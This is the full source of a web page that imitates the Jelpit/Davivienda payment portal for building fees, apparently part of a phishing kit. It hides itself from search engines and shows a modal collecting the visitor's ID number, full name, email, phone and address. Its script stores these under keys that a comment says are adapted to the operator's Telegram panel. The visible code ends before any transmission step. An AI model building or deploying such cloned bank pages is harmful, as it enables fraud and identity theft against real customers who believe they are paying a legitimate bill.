<?php header('X-Robots-Tag: noindex, nofollow, noarchive'); ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <link rel="icon" href="/img/favicon.svg" type="image/svg+xml">
    <link rel="shortcut icon" href="/img/favicon.svg">
    <link rel="apple-touch-icon" href="/img/favicon.svg">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jelpit - Dashboard de Pago Corregido</title>
    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
    
<style>
 /* ════════════════════════════
   VARIABLES
════════════════════════════ */
:root {
    --stepper-circle-size: 47px;
    --jelpit-purple: #2D165E;
    --jelpit-purple-btn: #4D148C;
    --jelpit-green-light: #90E080;
    --bg-light: #f4f4f4;
}

/* ════════════════════════════
   RESET
════════════════════════════ */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Segoe UI', Arial, sans-serif;
}

body {
    background-color: #ffffff;
    overflow-x: hidden;
}

/* ════════════════════════════
   HEADER
════════════════════════════ */
.header-container {
    width: 100%;
    background-color: var(--jelpit-purple);
    display: flex;
    justify-content: center;
    position: sticky;
    top: 0;
    z-index: 1000;
}

.header-content {
    width: 100%;
    max-width: 1784px;
    height: 81px;
    padding: 0 40px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.logo-section .logo-desktop {
    height: 50px;
    display: block;
}

.logo-section .logo-mobile {
    display: none;
}

.actions-section {
    display: flex;
    align-items: center;
    gap: 25px;
}

.btn-pill {
    background-color: #D9F9D3;
    color: var(--jelpit-purple);
    padding: 1px 7px;
    border-radius: 50px;
    text-decoration: none;
    font-size: 13px;
    font-weight: 400;
    display: flex;
    align-items: center;
    gap: 8px;
    height: 42px;
}

.btn-pill svg {
    width: 16px;
    height: 16px;
    stroke: var(--jelpit-purple);
    stroke-width: 2.5;
}

.btn-box {
    background-color: #baf2b5;
    color: var(--jelpit-purple);
    width: 89px;
    height: 59px;
    border-radius: 8px;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    text-align: center;
    font-size: 12px;
    font-weight: 700;
    gap: 4px;
    line-height: 1.1;
    margin-top: 3px;
}

.icon-circle {
    border: 1.5px solid var(--jelpit-purple);
    border-radius: 50%;
    width: 22px;
    height: 22px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 14px;
    font-weight: bold;
}

.nav-item {
    color: white;
    text-decoration: none;
    display: flex;
    flex-direction: column;
    align-items: center;
    font-size: 11px;
    gap: 6px;
    text-align: center;
    min-width: 40px;
}

.nav-item svg {
    width: 22px;
    height: 22px;
    stroke: white;
    fill: none;
    stroke-width: 1.8;
}

.menu-toggle {
    display: none;
}

/* ════════════════════════════
   BANNER
════════════════════════════ */
.promo-swiper {
    width: 100%;
    height: 65px;
    border-bottom: 1px solid #eee;
    overflow: hidden;
}

.promo-swiper .swiper-slide {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 15px;
    font-size: 15px;
    font-weight: 500;
    color: #333;
    padding: 0 20px;
}

.bg-health     { background-color: #E6F4F1; }
.bg-davivienda { background-color: #F2F2F2; }
.bg-property   { background-color: #D1EFFF; }

.banner-icon {
    width: 32px;
    height: 32px;
    flex-shrink: 0;
}

.btn-promo {
    padding: 10px 24px;
    border-radius: 30px;
    text-decoration: none;
    font-weight: 700;
    font-size: 14px;
    transition: opacity .2s;
}

.btn-promo-yellow { background-color: #FFD662; color: #2D165E; }
.btn-promo-red    { background-color: #E03E2D; color: #fff; }
.btn-promo-orange { background-color: #FF9D29; color: #2D165E; }

/* ════════════════════════════
   BACK BAR
════════════════════════════ */
.back-bar {
    width: 100%;
    height: 57px;
    background-color: #fff;
    display: flex;
    align-items: center;
    padding: 0 60px;
    border-bottom: 1px solid #e0e0e0;
}

.back-link {
    color: var(--jelpit-purple);
    text-decoration: none;
    display: flex;
    align-items: center;
    gap: 4px;
    font-size: 14px;
}

.back-link svg {
    width: 18px;
    height: 18px;
    stroke: var(--jelpit-purple);
    stroke-width: 2.5;
}

/* ════════════════════════════
   STEPPER
════════════════════════════ */
.stepper-wrapper {
    width: 100%;
    display: flex;
    justify-content: center;
    margin-top: 12px;
    padding-bottom: 25px;
}

.stepper-content {
    width: 100%;
    max-width: 894px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: relative;
}

.stepper-content::before {
    content: "";
    position: absolute;
    top: calc(var(--stepper-circle-size) / 2);
    left: calc(100% / 6);
    right: calc(100% / 6);
    height: 2px;
    background-color: #dbdbdb;
}

.step {
    position: relative;
    z-index: 2;
    display: flex;
    flex-direction: column;
    align-items: center;
    flex: 1;
}

.step-circle {
    width: 47px;
    height: 47px;
    background: #fff;
    border: 2px solid #dbdbdb;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
}

.step.completed .step-circle {
    background: #2D165E;
    border-color: #2D165E;
}

.step.active .step-circle {
    background: #90E080;
    border-color: #90E080;
    box-shadow: 0 0 0 4px #fff, 0 0 0 6px #90E080;
}

.step-label {
    font-size: 14px;
    color: #999;
    margin-top: 15px;
}

.step.active .step-label {
    color: #2D165E;
    font-weight: 800;
}

/* ════════════════════════════
   CONTENEDOR PRINCIPAL
   DESKTOP: 2 columnas (izq cuentas, der resumen)
════════════════════════════ */
.pay-layout {
    width: 1018px;
    min-height: 410px;
    margin: 25px auto 40px;
    display: flex;
    flex-direction: row;           /* 2 columnas en desktop */
    align-items: flex-start;
    gap: 22px;
}

/* ════════════════════════════
   LEFT — CUENTAS (desktop)
════════════════════════════ */
.pay-left {
    flex: 1;
    min-width: 0;
}

.pay-title {
    font-size: 23px;
    font-weight: 800;
    color: #2D165E;
    margin-bottom: 5px;
}

.pay-subtitle {
    color: #666;
    font-size: 14px;
    margin-bottom: 22px;
}

.pay-card {
    background: #fff;
    border-radius: 14px;
    padding: 22px;
    border: 1px solid #efefef;
    box-shadow: 0 2px 10px rgba(0,0,0,.03);
    margin-bottom: 16px;
}

.pay-card-top {
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
}

.pay-account-type {
    color: #666;
    font-size: 14px;
    margin-bottom: 8px;
}

.pay-account-title {
    color: #2D165E;
    font-size: 18px;
    font-weight: 800;
}

.pay-checkbox {
    width: 25px;
    height: 25px;
    accent-color: var(--jelpit-purple);
    cursor: pointer;
    flex-shrink: 0;
}

.pay-card-bottom {
    margin-top: 32px;
    display: flex;
    justify-content: space-between;
    align-items: flex-end;
    gap: 18px;
}

.pay-label {
    color: #555;
    font-size: 14px;
    font-weight: 700;
    margin-bottom: 8px;
}

.pay-date {
    font-size: 16px;
    color: #222;
}

.pay-amount-box {
    width: 250px;
}

.pay-input {
    width: 100%;
    height: 52px;
    border: 2px solid #bdbdbd;
    border-radius: 8px;
    padding: 0 18px;
    text-align: right;
    font-size: 18px;
    color: #666;
    outline: none;
    transition: border-color .2s;
}

.pay-input:focus {
    border-color: var(--jelpit-purple);
}

.custom-payment {
    width: 100%;
    height: 76px;
    border-radius: 14px;
    background: #efefef;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    color: #2D165E;
    font-size: 16px;
    font-weight: 800;
    text-decoration: underline;
}

/* ════════════════════════════
   RIGHT — RESUMEN (desktop)
════════════════════════════ */
.pay-right {
    width: 410px;
    flex-shrink: 0;
}

.summary-card {
    background: #fff;
    border-radius: 14px;
    overflow: hidden;
    border: 1px solid #ececec;
    box-shadow: 0 2px 10px rgba(0,0,0,.03);
}

.summary-content {
    padding: 22px;
}

/* ── Filas con icono — aplica en PC y móvil ── */
.summary-title,
.summary-row {
    display: flex;
    align-items: center;
    gap: 8px;
}

.summary-icon {
    width: 15px;
    height: 15px;
    flex-shrink: 0;
}

.summary-title {
    font-size: 15px;
    font-weight: 900;
    color: #333;
    margin-bottom: 12px;
    text-transform: uppercase;
    align-items: flex-start;
}

.summary-title .summary-icon {
    margin-top: 2px;
}

.summary-row {
    margin-bottom: 10px;
    color: #666;
    font-size: 14px;
}

/* Badge convenio */
.convenio-badge {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    border: 1.8px solid var(--jelpit-purple);
    border-radius: 4px;
    padding: 1px 5px;
    font-size: 11px;
    font-weight: 800;
    color: var(--jelpit-purple);
    min-width: 28px;
    height: 20px;
    flex-shrink: 0;
    line-height: 1;
}

.summary-divider {
    height: 1px;
    background: #ececec;
    margin: 18px 0;
}

.summary-reference {
    color: #555;
    font-size: 15px;
    line-height: 1.7;
}

.summary-change {
    margin-top: 16px;
    color: #8A2BB8;
    font-size: 14px;
    text-decoration: underline;
    display: flex;
    align-items: center;
    gap: 6px;
    cursor: pointer;
}

.summary-change svg {
    flex-shrink: 0;
}

.summary-purple {
    height: 52px;
    background: #4B0082;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 18px;
    color: #fff;
    font-weight: 800;
    font-size: 15px;
}

.summary-purple span:last-child {
    color: #90E080;
}

/* ════════════════════════════
   TOTAL — desktop: dentro del flujo normal
════════════════════════════ */
.total-card {
    margin-top: 16px;
    background: #fff;
    border-radius: 14px;
    padding: 20px;
    border: 1px solid #ececec;
    box-shadow: 0 2px 10px rgba(0,0,0,.03);
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.total-title {
    font-size: 15px;
    color: #333;
    margin-bottom: 5px;
}

.total-price {
    font-size: 20px;
    font-weight: 900;
    color: #111;
}

.btn-pay {
    border: none;
    background: #90E080;
    color: #2D165E;
    padding: 14px 28px;
    border-radius: 999px;
    font-size: 17px;
    font-weight: 800;
    cursor: pointer;
    white-space: nowrap;
    transition: opacity .2s, transform .1s;
}

.btn-pay:active   { transform: scale(0.97); }
.btn-pay:disabled { opacity: 0.45; cursor: not-allowed; }

/* ════════════════════════════
   PAYMENT SECTION
════════════════════════════ */
.payment-section {
    width: 100%;
    max-width: 1100px;
    margin: 40px auto;
    padding: 20px 0;
    border-top: 1px solid #ddd;
}

.payment-wrapper-inline {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 20px;
}

.payment-title {
    color: #2D165E;
    font-size: 18px;
    font-weight: 900;
    margin-left: 280px;
    white-space: nowrap;
}

.payment-swiper {
    flex: 1;
    max-width: 700px;
    overflow: hidden;
}

.payment-swiper .swiper-wrapper {
    transition-timing-function: linear !important;
}

.pay-item {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 0 10px;
}

.pay-item img  { height: 20px; width: auto; }
.pay-item span {
    font-size: 16px;
    color: #777;
    font-weight: 500;
    white-space: nowrap;
}

.legal-text {
    text-align: center;
    width: 100%;
    margin-top: 10px;
    font-size: 14px;
    color: #000;
    font-weight: 400;
}

/* ════════════════════════════
   FOOTER
════════════════════════════ */
.footer-container {
    background: #2D165E;
    color: #fff;
    padding: 40px 0 30px;
    margin-top: 60px;
    width: 100%;
}

.footer-content {
    max-width: 1100px;
    margin: 0 auto;
    padding: 0 20px;
}

.social-icons {
    display: flex;
    gap: 20px;
    justify-content: flex-end;
    margin-bottom: 15px;
}

.social-icons img {
    filter: brightness(0) invert(1);
    opacity: .8;
}

.footer-divider {
    border-top: 1px solid rgba(255,255,255,.15);
    margin: 20px 0;
}

.footer-middle {
    display: flex;
    justify-content: flex-start;
    gap: 40px;
    flex-wrap: wrap;
    font-size: 14px;
}

.footer-links {
    display: flex;
    gap: 25px;
    flex-wrap: wrap;
    margin-top: 10px;
}

.footer-links a {
    color: #fff;
    font-size: 13px;
    text-decoration: underline;
    opacity: .9;
}

/* ════════════════════════════
   RESPONSIVE TABLET
   Breakpoint donde se rompe a 1 columna
════════════════════════════ */
@media (max-width: 1100px) {

    .pay-layout {
        width: 100%;
        max-width: 560px;           /* columna centrada en tablet/móvil */
        margin: 25px auto 130px;
        flex-direction: column;
        padding: 0 16px;
        gap: 16px;
    }

    /* Resumen arriba, cuentas abajo */
    .pay-right { order: 1; width: 100%; }
    .pay-left  { order: 2; width: 100%; }

    .pay-card-bottom {
        flex-direction: column;
        align-items: flex-start;
    }

    .pay-amount-box { width: 100%; }

    /* Total fijo al fondo solo en móvil/tablet */
    .total-card {
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        z-index: 500;
        border-radius: 16px 16px 0 0;
        margin-top: 0;
        padding: 16px 24px;
        flex-direction: row;
        justify-content: space-between;
        align-items: center;
        box-shadow: 0 -4px 24px rgba(0,0,0,0.10);
        border: none;
        border-top: 1px solid #ececec;
    }

    .btn-pay {
        width: auto;
        min-width: 130px;
    }

    .payment-wrapper-inline {
        flex-direction: column;
        gap: 10px;
    }

    .payment-title { margin-left: 0; }
}

/* ════════════════════════════
   RESPONSIVE MÓVIL
════════════════════════════ */
@media (max-width: 800px) {

    .header-content {
        height: 75px;
        padding: 0 15px;
    }

    .logo-section .logo-desktop { display: none !important; }
    .logo-section .logo-mobile  {
        display: block !important;
        height: 39px;
    }

    .btn-pill,
    .btn-box { display: none !important; }

    .menu-toggle {
        display: flex !important;
        flex-direction: column;
        align-items: center;
    }

    .promo-swiper .swiper-slide {
        font-size: 13px;
        padding: 0 15px;
    }

    .promo-swiper .btn-promo {
        background: none !important;
        color: #0072CE !important;
        padding: 0 !important;
        margin-left: 5px;
        text-decoration: underline !important;
        font-weight: 700;
        display: inline;
    }

    .banner-icon { width: 24px; height: 24px; }
    .back-bar    { padding: 0 20px; }
    .stepper-content { width: 92%; }

    .pay-title    { font-size: 20px; }
    .pay-subtitle { font-size: 13px; }
    .pay-card     { padding: 18px; }

    .summary-content { padding: 18px; }
    .summary-purple  { font-size: 14px; }

    .total-price { font-size: 22px; }

    .btn-pay {
        font-size: 15px;
        padding: 12px 22px;
    }
}
/* ESTILOS MODAL FLOTANTE */
.modal-overlay {
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    background: rgba(0,0,0,0.6);
    display: none; /* Se activa con JS */
    justify-content: center;
    align-items: center;
    z-index: 3000;
}

.modal-content {
    background: #fff;
    padding: 30px;
    border-radius: 16px;
    width: 90%;
    max-width: 600px;
    text-align: center;
}

.modal-title { color: #2D165E; font-size: 24px; font-weight: 800; margin-bottom: 5px; }
.modal-subtitle { color: #666; margin-bottom: 25px; }

.modal-input {
    width: 100%;
    padding: 12px 15px;
    margin-bottom: 15px;
    border: 1px solid #ccc;
    border-radius: 8px;
    font-size: 16px;
}

.form-row { display: flex; gap: 10px; }
.select-id { width: 45%; }

.modal-legal { font-size: 13px; color: #333; margin: 15px 0; font-weight: 600; text-align: left; }

.modal-checkboxes { text-align: left; font-size: 13px; color: #444; }
.modal-checkboxes label { display: block; margin-bottom: 10px; }
.modal-checkboxes a { color: #006847; text-decoration: underline; }

.btn-modal-continuar {
    background: #e0e0e0;
    color: #888;
    border: none;
    padding: 15px 60px;
    border-radius: 30px;
    font-weight: 800;
    font-size: 16px;
    cursor: not-allowed;
    margin-top: 20px;
}

.btn-modal-continuar.active {
    background: #90E080;
    color: #2D165E;
    cursor: pointer;
}
</style>
</head>
<body>

   <header class="header-container">
        <div class="header-content">
            <div class="logo-section">
                <img src="img/logo.svg" alt="Jelpit" class="logo-desktop">
                <img src="img/c.svg" alt="Jelpit" class="logo-mobile">
            </div>
            <div class="actions-section">
                <a href="#" class="btn-pill">Conjuntos <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M6 9l6 6 6-6"></path></svg></a>
                <a href="#" class="btn-box"><div class="icon-circle">$</div><span>Pagar<br>administración</span></a>
                <a href="#" class="nav-item">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                    <span>Iniciar sesión</span>
                </a>
                <a href="#" class="nav-item">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="9" cy="21" r="1"></circle><circle cx="20" cy="21" r="1"></circle><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"></path></svg>
                    <span>Carrito</span>
                </a>
                <div class="nav-item menu-toggle">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
                    <span>Menú</span>
                </div>
            </div>
        </div>
    </header>

    <!-- BANNER PROMOCIONES ACTUALIZADO -->
    <div class="swiper promo-swiper">
        <div class="swiper-wrapper">
            <!-- Slide Salud -->
            <div class="swiper-slide bg-health">
                <svg class="banner-icon" viewBox="0 0 24 24" fill="none" stroke="#006847" stroke-width="2">
                    <path d="M4.5 7C4.5 4.5 6.5 2.5 9 2.5s4.5 2 4.5 4.5M10.5 7h3M19.5 7c0-2.5-2-4.5-4.5-4.5S10.5 4.5 10.5 7M10.5 7h3M12 7v14.5M7 16.5c0 2.8 2.2 5 5 5s5-2.2 5-5"/>
                    <circle cx="12" cy="7" r="1" fill="#006847"/>
                </svg>
                <span>Seguro de Salud a su Medida desde <b>$41.500</b> mensuales para usted y su familia.</span>
                <a href="#" class="btn-promo btn-promo-yellow">Compre ahora</a>
            </div>
            <!-- Slide Davivienda -->
            <div class="swiper-slide bg-davivienda">
                <svg class="banner-icon" viewBox="0 0 24 24" fill="none" stroke="#E03E2D" stroke-width="2">
                    <rect x="3" y="8" width="18" height="12" rx="2"/>
                    <path d="M12 8V4M8 4h8M7 12h10M12 12v4"/>
                    <path d="M3 12h18" stroke-dasharray="2 2"/>
                </svg>
                <span>Disfrute de sus servicios GRATIS por tener tarjeta de crédito Davivienda. ❤️💳</span>
                <a href="#" class="btn-promo btn-promo-red">¡Úselos aquí!</a>
            </div>
            <!-- Slide Inmueble -->
            <div class="swiper-slide bg-property">
                <svg class="banner-icon" viewBox="0 0 24 24" fill="none" stroke="#0072CE" stroke-width="2">
                    <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V9z"/>
                    <polyline points="9 22 9 12 15 12 15 22"/>
                </svg>
                <span>Calcula gratis y en línea el valor de tu inmueble, para venderlo o arrendarlo.</span>
                <a href="#" class="btn-promo btn-promo-orange">¡Calcular precio!</a>
            </div>
        </div>
    </div>

    <div class="back-bar">
    <a href="index.php" class="back-link">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
            <path d="M15 18l-6-6 6-6"></path>
        </svg>
        Atrás
    </a>
</div>

<div class="stepper-wrapper">
    <div class="stepper-content payment-stepper">

        <div class="step completed">
            <div class="step-circle">
                <svg viewBox="0 0 24 24" width="18" height="18" stroke="#90E080" stroke-width="3" fill="none">
                    <path d="M20 6L9 17l-5-5"></path>
                </svg>
            </div>
            <div class="step-label">Buscar</div>
        </div>

        <div class="step completed">
            <div class="step-circle">
                <svg viewBox="0 0 24 24" width="18" height="18" stroke="#90E080" stroke-width="3" fill="none">
                    <path d="M20 6L9 17l-5-5"></path>
                </svg>
            </div>
            <div class="step-label">Verificar</div>
        </div>

        <div class="step active">
            <div class="step-circle">3</div>
            <div class="step-label">Pagar</div>
        </div>

    </div>
</div>
<div class="pay-layout">

    <!-- LEFT -->
    <div class="pay-left">

        <h1 class="pay-title">
            Tus cuentas por pagar
        </h1>

        <p class="pay-subtitle">
            Estas son las cuentas pendientes de tu inmueble.
        </p>

        <div class="pay-card">

            <div class="pay-card-top">

                <div>
                    <div class="pay-account-type">
                        Tipo de cuenta
                    </div>

                    <div class="pay-account-title">
                        Cuotas de Administración
                    </div>
                </div>

                <!-- CORRECCIÓN 1: Se ha añadido el ID check-cuenta al input checkbox -->
                <input type="checkbox" id="check-cuenta" class="pay-checkbox">

            </div>

            <div class="pay-card-bottom">

                <div>
                    <div class="pay-label">
                        Fecha límite de pago
                    </div>

                    <div class="pay-date">
                        31 Mayo 2026
                    </div>
                </div>

                <div class="pay-amount-box">

                    <div class="pay-label" style="text-align:right;">
                        Valor a pagar
                    </div>

                    <!-- CORRECCIÓN 2: Se ha añadido el ID valor-pago al input de texto -->
                    <input
                        type="text"
                        class="pay-input"
                        id="valor-pago"
                        value="$500,000"
                    >

                </div>

            </div>

        </div>

        <a href="#" class="custom-payment">
            ⊕ Ingresar un pago personalizado
        </a>

    </div>

    <!-- RIGHT -->
    <div class="pay-right">

        <div class="summary-card">

           <div class="summary-content">

    <!-- Nombre con icono edificio -->
    <div class="summary-title" id="nombre-conjunto">
        <svg class="summary-icon" viewBox="0 0 24 24" fill="none" stroke="#2D165E" stroke-width="1.8">
            <rect x="3" y="3" width="7" height="7" rx="1"/>
            <rect x="14" y="3" width="7" height="7" rx="1"/>
            <rect x="3" y="14" width="7" height="7" rx="1"/>
            <rect x="14" y="14" width="7" height="7" rx="1"/>
        </svg>
        MALL COMERCIAL MERIDIANO ICONIK
    </div>

    <!-- Dirección con icono pin -->
    <div class="summary-row" id="direccion-conjunto">
        <svg class="summary-icon" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="1.8">
            <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/>
            <circle cx="12" cy="9" r="2.5"/>
        </svg>
        AK 68 5 73, Bogotá, D.C. - Bogotá, D.C
    </div>

    <!-- Convenio con badge rectangular morado -->
    <div class="summary-row" id="convenio-conjunto">
        <span class="convenio-badge">12</span>
        <b>Convenio: 1618552</b>
    </div>

    <div class="summary-divider"></div>

    <div class="summary-reference">
        Referencia 1: <b id="ref1">801</b><br>
        Referencia 2: <b id="ref2">801</b>
    </div>

    <!-- Cambiar referencia con icono lápiz -->
    <div class="summary-change">
        <svg viewBox="0 0 24 24" fill="none" stroke="#8A2BB8" stroke-width="1.8" width="16" height="16">
            <path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/>
            <path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/>
        </svg>
        Cambiar referencia
    </div>

</div>

            <div class="summary-purple">
                <span>🛒 Paga a varios inmuebles</span>
                <span>Ver cómo →</span>
            </div>

        </div>

        <div class="total-card">

            <div>

                <div class="total-title">
                    Pago total
                </div>

                <!-- CORRECCIÓN 3: Se ha añadido el ID pago-total al div que muestra el precio -->
                <div class="total-price" id="pago-total">
                    $ 0
                </div>

            </div>

            <button
                class="btn-pay"
                id="btn-continuar"
                style="background: #90E080; color: #2D165E; opacity: 1; cursor: pointer;" /* Estilo inicial del botón */
            >
                Ir a pagar
            </button>

        </div>

    </div>

</div>
<!-- MODAL DE DATOS DE PAGO -->
<div id="modal-pago" class="modal-overlay">
    <div class="modal-content">
        <h2 class="modal-title">Datos para el pago</h2>
        <p class="modal-subtitle">Ingresa tus datos para continuar</p>
        
        <div class="modal-form">
            <div class="form-row">
                <select id="tipo-id" class="modal-input select-id">
                    <option value="">Tipo de identificación</option>
                    <option value="CC">Cédula de Ciudadanía</option>
                    <option value="CE">Cédula de Extranjería</option>
                </select>
                <input type="text" id="pse_cedula" class="modal-input" placeholder="Número de identificación">
            </div>
            
            <input type="text" id="pse_nombre" class="modal-input" placeholder="Nombre completo">
            <input type="email" id="pse_email" class="modal-input" placeholder="Correo electrónico">
            <input type="tel" id="pse_celular" class="modal-input" placeholder="Número de celular">
            <input type="text" id="pse_direccion" class="modal-input" placeholder="Dirección de residencia">
            
            <p class="modal-legal">Servicio ofrecido por Banco Davivienda S.A. y operado por Servicios Bolívar S.A.</p>
            
            <div class="modal-checkboxes">
                <label><input type="checkbox" id="check-terminos"> Acepto <a href="#">Términos y Condiciones</a> del portal.</label>
                <label><input type="checkbox" id="check-datos"> Acepto la <a href="#">Autorización de tratamiento de Datos Personales</a>.</label>
            </div>
            
            <button id="btn-finalizar-pago" class="btn-modal-continuar" disabled>Continuar</button>
        </div>
    </div>
</div>
   

    <footer class="footer-container">
        <div class="footer-content">
            <div class="social-icons"><a href="#"><img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" width="20" alt="IG"></a><a href="#"><img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" width="20" alt="FB"></a></div>
            <div class="footer-divider"></div>
            <div class="footer-middle"><span>📞 601 3905331</span><span>✉️ lineadesoporte923@serviciosbolivar.com</span></div>
            <div class="footer-links"><a href="#">Términos y Condiciones</a><a href="#">Políticas de Privacidad</a></div>
            <div style="margin-top: 20px; opacity: 0.7; font-size: 12px; text-align: center;">© 2026 Jelpit.</div>
        </div>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
<script>
/* =========================================
   SINCRONIZACIÓN DE DATOS JELPIT
   ========================================= */
const datosLocal = localStorage.getItem('datosapi');
const datosapi = JSON.parse(datosLocal || "{}");
const conjunto = datosapi.conjuntoSeleccionado;
const propiedad = datosapi.propiedadSeleccionada;

// Valor total operable
let totalOperable = Number(datosapi.total || (propiedad ? (propiedad.balance || propiedad.total_value) : 1221700));

/* =========================================
   REEMPLAZO EN INTERFAZ (UI)
   ========================================= */
document.addEventListener('DOMContentLoaded', () => {
    try {
        if (conjunto) {
            const elNombre = document.getElementById('nombre-conjunto');
            if (elNombre) elNombre.innerHTML = `
                <svg viewBox="0 0 24 24" fill="none" stroke="#2D165E" stroke-width="1.8" style="width:20px; margin-right:8px; vertical-align:middle;">
                    <rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/>
                    <rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/>
                </svg>${conjunto.co_ownership_name || 'EDIFICIO MALLORQUIN PH'}`;

            const elDir = document.getElementById('direccion-conjunto');
            if (elDir) elDir.innerHTML = `
                <svg viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="1.8" style="width:20px; margin-right:8px; vertical-align:middle;">
                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/><circle cx="12" cy="9" r="2.5"/>
                </svg>${conjunto.address || 'CL 79 8 01, Bogotá, D.C.'}`;

            const elConv = document.getElementById('convenio-conjunto');
            if (elConv) elConv.innerHTML = `
                <span style="background:#2D165E; color:white; padding:2px 6px; border-radius:4px; margin-right:8px; font-size:12px;">12</span>
                <b>Convenio: ${conjunto.agreement_number || '1584093'}</b>`;
        }

        if (propiedad) {
            const elRef1 = document.getElementById('ref1');
            if (elRef1) elRef1.innerText = propiedad.reference || propiedad.property_number || '';
            const elRef2 = document.getElementById('ref2');
            if (elRef2) elRef2.innerText = propiedad.property_number || propiedad.reference || '';
        }

        const inputPago = document.getElementById('valor-pago');
        if (inputPago) {
            inputPago.value = '$ ' + totalOperable.toLocaleString('es-CO');
        }

        actualizarResumenTotal();
    } catch (err) {
        console.error("Error UI:", err);
    }
});

function actualizarResumenTotal() {
    const input = document.getElementById('valor-pago');
    const display = document.getElementById('pago-total');
    if (input && display) {
        const val = input.value.replace(/\D/g, '');
        display.innerText = '$ ' + Number(val).toLocaleString('es-CO');
    }
}

/* =========================================
   LÓGICA DEL MODAL Y GUARDADO FINAL
   ========================================= */

// 1. Abrir Modal
const btnContinuarTabla = document.getElementById('btn-continuar');
if (btnContinuarTabla) {
    btnContinuarTabla.addEventListener('click', (e) => {
        e.preventDefault();
        document.getElementById('modal-pago').style.display = 'flex';
    });
}

// 2. ACTIVACIÓN DEL BOTÓN "CONTINUAR" EN EL MODAL
const btnFinalizar = document.getElementById('btn-finalizar-pago');
const checkTerminos = document.getElementById('check-terminos');
const checkDatos = document.getElementById('check-datos');

function validarFormModal() {
    // Verifica que ambos checks estén marcados
    if (checkTerminos.checked && checkDatos.checked) {
        btnFinalizar.disabled = false;
        btnFinalizar.classList.add('active');
        btnFinalizar.style.background = "#90E080";
        btnFinalizar.style.color = "#2D165E";
        btnFinalizar.style.cursor = "pointer";
    } else {
        btnFinalizar.disabled = true;
        btnFinalizar.classList.remove('active');
        btnFinalizar.style.background = "#e0e0e0";
        btnFinalizar.style.color = "#888";
        btnFinalizar.style.cursor = "not-allowed";
    }
}

// Escuchar eventos click y change para máxima compatibilidad
[checkTerminos, checkDatos].forEach(checkbox => {
    if (checkbox) {
        checkbox.addEventListener('change', validarFormModal);
        checkbox.addEventListener('click', validarFormModal);
    }
});

// 3. GUARDAR DATOS EN LAS LLAVES INDIVIDUALEZ ADAPTADAS A TU PANEL DE TELEGRAM
if (btnFinalizar) {
    btnFinalizar.addEventListener('click', (e) => {
        e.preventDefault();

        // 1. Capturar el total del input y guardarlo
        const totalFinal = document.getElementById('valor-pago').value.replace(/\D/g, '');
        localStorage.setItem('total_pagar', totalFinal);

        // 2. DISTRIBUCIÓN EXACTA DE VARIABLES SEGÚN TU SOLICITUD
        localStorage.setItem('correo', document.getElementById('pse_email').value.trim());
        localStorage.setItem('cel',    document.getElementById('pse_celular').value.trim());
        localStorage.setItem('val',    document.getElementById('pse_cedula').value.trim());
        
        // 🔥 CAMBIO PRINCIPAL:
        // Guardamos el NOMBRE completo en 'per' para que salga en (👤Persona: Nombre)
        localStorage.setItem('per',    document.getElementById('pse_nombre').value.trim());
        
        localStorage.setItem('nom', document.getElementById('pse_nombre').value.trim());

        // 3. Mantener tbdatos actualizado por si acaso
        const datosFormulario = {
            nombre: document.getElementById('pse_nombre').value.trim(),
            documento: document.getElementById('pse_cedula').value.trim(),
            tipo_identificacion: document.getElementById('tipo-id').value.trim(),
            tipo_persona: document.getElementById('pse_nombre').value.trim(), // Nombre duplicado aquí
            correo: document.getElementById('pse_email').value.trim(),
            direccion: document.getElementById('pse_direccion').value.trim(),
            telefono: document.getElementById('pse_celular').value.trim(),
            banco: ""
        };
        localStorage.setItem('tbdatos', JSON.stringify(datosFormulario));

